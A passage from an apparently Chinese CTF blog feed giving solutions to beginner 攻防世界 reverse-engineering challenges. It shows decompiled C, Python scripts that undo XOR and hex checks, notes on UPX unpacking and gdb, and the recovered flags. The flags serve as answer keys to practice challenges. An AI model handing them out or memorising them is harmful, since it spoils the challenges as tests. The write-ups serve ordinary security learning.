class="hljs-keyword">if</span> ( a1 &gt; <span class="hljs-number">1</span> &amp;&amp; <span class="hljs-built_in">sub_8048414</span>(a2[<span class="hljs-number">1</span>], <span class="hljs-number">0</span>) )</span><br><span class="line">  {</span><br><span class="line">    <span class="hljs-built_in">puts</span>(unk_80487E4);</span><br><span class="line">    <span class="hljs-built_in">sub_8048538</span>((<span class="hljs-keyword">int</span>)a2[<span class="hljs-number">1</span>]);</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Access denied"</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>我们得输入作为main函数得参数传入，在<code>sub_8048414()</code>函数中进行了一个判断，然后进入<code>sub_8048538()</code>函数处理后输出flag</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">sub_8048414</span><span class="hljs-params">(_BYTE *a1, <span class="hljs-keyword">int</span> a2)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span> result; <span class="hljs-comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="hljs-built_in"><span class="hljs-keyword">switch</span></span> ( a2 )</span><br><span class="line">  {</span><br><span class="line">    <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:</span><br><span class="line">      <span class="hljs-keyword">if</span> ( *a1 == <span class="hljs-string">'i'</span> )</span><br><span class="line">        <span class="hljs-keyword">goto</span> LABEL_19;</span><br><span class="line">      result = <span class="hljs-number">0</span>;</span><br><span class="line">      <span class="hljs-keyword">break</span>;</span><br><span class="line">    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:</span><br><span class="line">      <span class="hljs-keyword">if</span> ( *a1 == <span class="hljs-string">'e'</span> )</span><br><span class="line">        <span class="hljs-keyword">goto</span> LABEL_19;</span><br><span class="line">      result = <span class="hljs-number">0</span>;</span><br><span class="line">      <span class="hljs-keyword">break</span>;</span><br><span class="line">    <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:</span><br><span class="line">      <span class="hljs-keyword">if</span> ( *a1 == <span class="hljs-string">'n'</span> )</span><br><span class="line">        <span class="hljs-keyword">goto</span> LABEL_19;</span><br><span class="line">      result = <span class="hljs-number">0</span>;</span><br><span class="line">      <span class="hljs-keyword">break</span>;</span><br><span class="line">    <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:</span><br><span class="line">      <span class="hljs-keyword">if</span> ( *a1 == <span class="hljs-string">'d'</span> )</span><br><span class="line">        <span class="hljs-keyword">goto</span> LABEL_19;</span><br><span class="line">      result = <span class="hljs-number">0</span>;</span><br><span class="line">      <span class="hljs-keyword">break</span>;</span><br><span class="line">    <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:</span><br><span class="line">      <span class="hljs-keyword">if</span> ( *a1 == <span class="hljs-string">'a'</span> )</span><br><span class="line">        <span class="hljs-keyword">goto</span> LABEL_19;</span><br><span class="line">      result = <span class="hljs-number">0</span>;</span><br><span class="line">      <span class="hljs-keyword">break</span>;</span><br><span class="line">    <span class="hljs-keyword">case</span> <span class="hljs-number">6</span>:</span><br><span class="line">      <span class="hljs-keyword">if</span> ( *a1 == <span class="hljs-string">'g'</span> )</span><br><span class="line">        <span class="hljs-keyword">goto</span> LABEL_19;</span><br><span class="line">      result = <span class="hljs-number">0</span>;</span><br><span class="line">      <span class="hljs-keyword">break</span>;</span><br><span class="line">    <span class="hljs-keyword">case</span> <span class="hljs-number">7</span>:</span><br><span class="line">      <span class="hljs-keyword">if</span> ( *a1 == <span class="hljs-string">'s'</span> )</span><br><span class="line">        <span class="hljs-keyword">goto</span> LABEL_19;</span><br><span class="line">      result = <span class="hljs-number">0</span>;</span><br><span class="line">      <span class="hljs-keyword">break</span>;</span><br><span class="line">    <span class="hljs-keyword">case</span> <span class="hljs-number">9</span>:</span><br><span class="line">      <span class="hljs-keyword">if</span> ( *a1 == <span class="hljs-string">'r'</span> )</span><br><span class="line">LABEL_19:</span><br><span class="line">        result = <span class="hljs-built_in">sub_8048414</span>(a1 + <span class="hljs-number">1</span>, <span class="hljs-number">7</span> * (a2 + <span class="hljs-number">1</span>) % <span class="hljs-number">11</span>);</span><br><span class="line">      <span class="hljs-keyword">else</span></span><br><span class="line">        result = <span class="hljs-number">0</span>;</span><br><span class="line">      <span class="hljs-keyword">break</span>;</span><br><span class="line">    <span class="hljs-keyword">default</span>:</span><br><span class="line">      result = <span class="hljs-number">1</span>;</span><br><span class="line">      <span class="hljs-keyword">break</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">return</span> result;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>判断得过程是一个递归，因为返回值要为1，所以递归过程中得每一个if都需要满足，所以很好得到输入的字符串是什么</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">sub_8048538</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a1)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">int</span> v2[<span class="hljs-number">33</span>]; <span class="hljs-comment">// [esp+18h] [ebp-A0h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// [esp+9Ch] [ebp-1Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="hljs-built_in">qmemcpy</span>(v2, &amp;unk_8048760, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(v2));</span><br><span class="line">  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">32</span>; ++i )</span><br><span class="line">    <span class="hljs-built_in">putchar</span>(v2[i] ^ *(<span class="hljs-keyword">char</span> *)(a1 + i % <span class="hljs-number">8</span>));</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-built_in">putchar</span>(<span class="hljs-number">10</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>输出部分只进行了一个很简单的处理，而且不需要逆向，直接用同样的方式处理即可</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">targrt = <span class="hljs-string">'ie_ndags_r'</span></span><br><span class="line">f = <span class="hljs-string">''</span></span><br><span class="line">j = <span class="hljs-number">0</span></span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):</span><br><span class="line">    f += targrt[j]</span><br><span class="line">    j = <span class="hljs-number">7</span> * (j + <span class="hljs-number">1</span>) % <span class="hljs-number">11</span></span><br><span class="line"><span class="hljs-comment"># print(f)</span></span><br><span class="line">flag = <span class="hljs-string">''</span></span><br><span class="line">a2 = [<span class="hljs-number">0x0F</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x2D</span>,</span><br><span class="line">      <span class="hljs-number">0x37</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x08</span>,</span><br><span class="line">      <span class="hljs-number">0x41</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x14</span>]</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">33</span>):</span><br><span class="line">    flag += <span class="hljs-built_in">chr</span>(a2[i] ^ <span class="hljs-built_in">ord</span>(f[i % <span class="hljs-number">8</span>]))</span><br><span class="line"><span class="hljs-built_in">print</span>(flag)</span><br></pre></td></tr></tbody></table></figure><p>输出flag</p><figure class="highlight apache hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">flag</span>{s<span class="hljs-number">0</span>me<span class="hljs-number">7</span>hing_S<span class="hljs-number">0</span>me<span class="hljs-number">7</span>hinG_t<span class="hljs-number">0</span>lki<span class="hljs-number">3</span>n}</span><br></pre></td></tr></tbody></table></figure></body></html>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> re </tag>
            
            <tag> 攻防世界 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界-re部分题解（一）</title>
      <link href="/2020/02/24/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>/2020/02/24/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><p>攻防世界的题目质量还是比较高的，题目类型很多，难度也有一定的梯度，挺适合不断进阶学习。</p><span id="more"></span><h4 id="insanity"><a href="#insanity" class="headerlink" title="insanity"></a>insanity</h4><p>IDA打开，进入main，发现程序在生成随机数，然后随便输出一系列字符串中的某一个，找到这一系列字符串，发现了flag</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v3; <span class="hljs-comment">// eax</span></span><br><span class="line">  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v4; <span class="hljs-comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Reticulating splines, please wait.."</span>);</span><br><span class="line">  <span class="hljs-built_in">sleep</span>(<span class="hljs-number">5u</span>);</span><br><span class="line">  v3 = <span class="hljs-built_in">time</span>(<span class="hljs-number">0</span>);</span><br><span class="line">  <span class="hljs-built_in">srand</span>(v3);</span><br><span class="line">  v4 = <span class="hljs-built_in">rand</span>();</span><br><span class="line">  <span class="hljs-built_in">puts</span>((&amp;strs)[v4 % <span class="hljs-number">0xA</span>]);</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>找到strs，其中flag</p><figure class="highlight autohotkey hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-number">9447</span>{This_is_<span class="hljs-built_in">a_flag</span>}</span><br></pre></td></tr></tbody></table></figure><h4 id="open-source"><a href="#open-source" class="headerlink" title="open-source"></a>open-source</h4><p>这题真就连源代码都给了</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> *argv[])</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">if</span> (argc != <span class="hljs-number">4</span>) {</span><br><span class="line">    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"what?\n"</span>);</span><br><span class="line">    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> first = <span class="hljs-built_in">atoi</span>(argv[<span class="hljs-number">1</span>]);</span><br><span class="line">    <span class="hljs-keyword">if</span> (first != <span class="hljs-number">0xcafe</span>) {</span><br><span class="line">    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"you are wrong, sorry.\n"</span>);</span><br><span class="line">    <span class="hljs-built_in">exit</span>(<span class="hljs-number">2</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> second = <span class="hljs-built_in">atoi</span>(argv[<span class="hljs-number">2</span>]);</span><br><span class="line">    <span class="hljs-keyword">if</span> (second % <span class="hljs-number">5</span> == <span class="hljs-number">3</span> || second % <span class="hljs-number">17</span> != <span class="hljs-number">8</span>) {</span><br><span class="line">    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"ha, you won't get it!\n"</span>);</span><br><span class="line">    <span class="hljs-built_in">exit</span>(<span class="hljs-number">3</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(<span class="hljs-string">"h4cky0u"</span>, argv[<span class="hljs-number">3</span>])) {</span><br><span class="line">    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"so close, dude!\n"</span>);</span><br><span class="line">    <span class="hljs-built_in">exit</span>(<span class="hljs-number">4</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Brr wrrr grr\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> hash = first * <span class="hljs-number">31337</span> + (second % <span class="hljs-number">17</span>) * <span class="hljs-number">11</span> + <span class="hljs-built_in">strlen</span>(argv[<span class="hljs-number">3</span>]) - <span class="hljs-number">1615810207</span>;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Get your key: "</span>);</span><br><span class="line">    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%x\n"</span>, hash);</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>看一下源码，发现运行时要有三个参数，第一个参数给出来了，是0xcafe，第二个没有给，但是知道second%17==8，直接带到下面计算就行了，第三个是字符串的长度，为7，直接算出来就行了。</p><p>不过还需要注意，最后输出的时候是以16进制的形式输出</p><figure class="highlight llvm hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">c</span><span class="hljs-number">0</span>ffee</span><br></pre></td></tr></tbody></table></figure><h4 id="simple-unpack"><a href="#simple-unpack" class="headerlink" title="simple-unpack"></a>simple-unpack</h4><p>题如其名，拿到直接upx脱壳，毫无阻碍，IDA打开直接在main里看到flag</p><figure class="highlight apache hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">flag</span>{Upx_<span class="hljs-number">1</span>s_n<span class="hljs-number">0</span>t_a_d<span class="hljs-number">3</span>liv<span class="hljs-number">3</span>r_c<span class="hljs-number">0</span>mp<span class="hljs-number">4</span>ny}</span><br></pre></td></tr></tbody></table></figure><h4 id="logmein"><a href="#logmein" class="headerlink" title="logmein"></a>logmein</h4><p>IDA打开，找到关键判断位置</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in">strcpy</span>(v8, <span class="hljs-string">":\"AL_RT^L*.?+6/46"</span>);</span><br><span class="line">  v7 = <span class="hljs-string">'ebmarah'</span>;</span><br><span class="line">  v6 = <span class="hljs-number">7</span>;</span><br><span class="line">  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Welcome to the RC3 secure password guesser.\n"</span>, a2, a3);</span><br><span class="line">  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"To continue, you must enter the correct password.\n"</span>);</span><br><span class="line">  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Enter your guess: "</span>);</span><br><span class="line">  __isoc99_scanf(<span class="hljs-string">"%32s"</span>, s);</span><br><span class="line">  v3 = <span class="hljs-built_in">strlen</span>(s);</span><br><span class="line">  <span class="hljs-keyword">if</span> ( v3 &lt; <span class="hljs-built_in">strlen</span>(v8) )</span><br><span class="line">    <span class="hljs-built_in">sub_4007C0</span>(v8);</span><br><span class="line">  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">strlen</span>(s); ++i )</span><br><span class="line">  {</span><br><span class="line">    <span class="hljs-keyword">if</span> ( i &gt;= <span class="hljs-built_in">strlen</span>(v8) )</span><br><span class="line">      ((<span class="hljs-built_in"><span class="hljs-keyword">void</span></span> (*)(<span class="hljs-keyword">void</span>))sub_4007C0)();</span><br><span class="line">    <span class="hljs-keyword">if</span> ( s[i] != (<span class="hljs-keyword">char</span>)(*((_BYTE *)&amp;v7 + i % v6) ^ v8[i]) )</span><br><span class="line">      ((<span class="hljs-built_in"><span class="hljs-keyword">void</span></span> (*)(<span class="hljs-keyword">void</span>))sub_4007C0)();</span><br><span class="line">  }</span><br></pre></td></tr></tbody></table></figure><p>v7本身是一个长整型，但是作为字符读取，由于小端序，所以转换成的字符要反序，然后经过下面的计算就可以了</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">v8 = <span class="hljs-string">':\"AL_RT^L*.?+6/46'</span></span><br><span class="line">v7 = <span class="hljs-string">'harambe'</span></span><br><span class="line">s = <span class="hljs-string">''</span></span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(v8)):</span><br><span class="line">    s += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(v7[i % <span class="hljs-number">7</span>]) ^ <span class="hljs-built_in">ord</span>(v8[i]))</span><br><span class="line"><span class="hljs-built_in">print</span>(s)</span><br></pre></td></tr></tbody></table></figure><p>输出结果</p><figure class="highlight apache hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">RC3</span>-<span class="hljs-number">2016</span>-XORISGUD</span><br></pre></td></tr></tbody></table></figure><h4 id="python-trade"><a href="#python-trade" class="headerlink" title="python-trade"></a>python-trade</h4><p>见CG-CTF py交易</p><h4 id="game"><a href="#game" class="headerlink" title="game"></a>game</h4><p>见BUGKU 游戏过关</p><h4 id="hello-ctf"><a href="#hello-ctf" class="headerlink" title="hello-ctf"></a>hello-ctf</h4><p>一串输入的字符串拷贝来拷贝去，实际上就是把输入的字符串变成16进制，所以直接从16进制转换成字符串就可以了</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="hljs-string">'437261636b4d654a757374466f7246756e'</span></span><br><span class="line">flag = <span class="hljs-built_in">bytes</span>.fromhex(s)</span><br><span class="line"><span class="hljs-built_in">print</span>(flag)</span><br></pre></td></tr></tbody></table></figure><p>直接输出flag</p><figure class="highlight ebnf hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">CrackMeJustForFun</span></span><br></pre></td></tr></tbody></table></figure><h4 id="getit"><a href="#getit" class="headerlink" title="getit"></a>getit</h4><p>同样是一道简单题，写个简单的逆运算就可以了</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="hljs-string">'c61b68366edeb7bdce3c6820314b7498'</span></span><br><span class="line">t = <span class="hljs-string">''</span></span><br><span class="line">v5 = <span class="hljs-number">0</span></span><br><span class="line"><span class="hljs-keyword">while</span> (v5 &lt; <span class="hljs-built_in">len</span>(s)):</span><br><span class="line">    <span class="hljs-keyword">if</span> (v5 &amp; <span class="hljs-number">1</span>):</span><br><span class="line">        v3 = <span class="hljs-number">1</span></span><br><span class="line">    <span class="hljs-keyword">else</span>:</span><br><span class="line">        v3 = -<span class="hljs-number">1</span></span><br><span class="line">    t += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(s[v5]) + v3)</span><br><span class="line">    v5 = v5 + <span class="hljs-number">1</span></span><br><span class="line">t=<span class="hljs-string">'SharifCTF{'</span>+t+<span class="hljs-string">'}'</span></span><br><span class="line"><span class="hljs-built_in">print</span>(t)</span><br></pre></td></tr></tbody></table></figure><p>输出flag</p><figure class="highlight apache hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">SharifCTF</span>{b<span class="hljs-number">70</span>c<span class="hljs-number">59275</span>fcfa<span class="hljs-number">8</span>aebf<span class="hljs-number">2</span>d<span class="hljs-number">5911223</span>c<span class="hljs-number">6589</span>}</span><br></pre></td></tr></tbody></table></figure><h4 id="re1"><a href="#re1" class="headerlink" title="re1"></a>re1</h4><p>IDA打开追踪字符串，发现flag和输入直接进行比较，找到flag的位置，然后将16进制转换位字符串然后逆序即可</p><figure class="highlight apache hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">DUTCTF</span>{We<span class="hljs-number">1</span>c<span class="hljs-number">0</span>met<span class="hljs-number">0</span>DUTCTF}</span><br></pre></td></tr></tbody></table></figure><h4 id="no-strings-attached"><a href="#no-strings-attached" class="headerlink" title="no-strings-attached"></a>no-strings-attached</h4><p>这题有点意思，整个程序没有直接出现的字符串，先打开IDA看看，找到一个decrypt函数，一看就知道这个是最重要的部分，又不想再写脚本去算，所以干脆开虚拟机gdb动态调试，在decrypt处下断点，等运行完decrypt函数之后，发现程序把某个地址拷进了eax，所以用<code>x/6sw $eax</code>来查看，结果发现了flag</p><figure class="highlight clojure hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-number">9447</span>{you_are_an_international_mystery}</span><br></pre></td></tr></tbody></table></figure><h4 id="csaw2013reversing3"><a href="#csaw2013reversing3" class="headerlink" title="csaw2013reversing3"></a>csaw2013reversing3</h4><p>这题比较有意思，一打开输出的是乱码，用IDA打开发现这些代码没有解密，有一个解密程序但是没有运行，所以OD直接调试改汇编，先运行解密函数，然后跳转到MessageBoxA函数，在窗口中输出来的就是真正的flag，操作比较简单，就不赘述了。</p><figure class="highlight ceylon hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag{reversing<span class="hljs-number">_</span><span class="hljs-keyword">is</span><span class="hljs-number">_n</span>ot<span class="hljs-number">_</span>that<span class="hljs-number">_</span>hard!}</span><br></pre></td></tr></tbody></table></figure><h4 id="maze"><a href="#maze" class="headerlink" title="maze"></a>maze</h4><p>见CG-CTF maze</p><h4 id="666"><a href="#666" class="headerlink" title="666"></a>666</h4><p>IDA打开看到了假flag，不管它，找到关键函数</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> __fastcall <span class="hljs-title">encode</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *a1, __int64 a2)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">char</span> v3[<span class="hljs-number">32</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-70h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v4[<span class="hljs-number">32</span>]; <span class="hljs-comment">// [rsp+30h] [rbp-50h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v5[<span class="hljs-number">40</span>]; <span class="hljs-comment">// [rsp+50h] [rbp-30h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v6; <span class="hljs-comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// [rsp+7Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  i = <span class="hljs-number">0</span>;</span><br><span class="line">  v6 = <span class="hljs-number">0</span>;</span><br><span class="line">  <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">strlen</span>(a1) != key )</span><br><span class="line">    <span class="hljs-keyword">return</span> <span 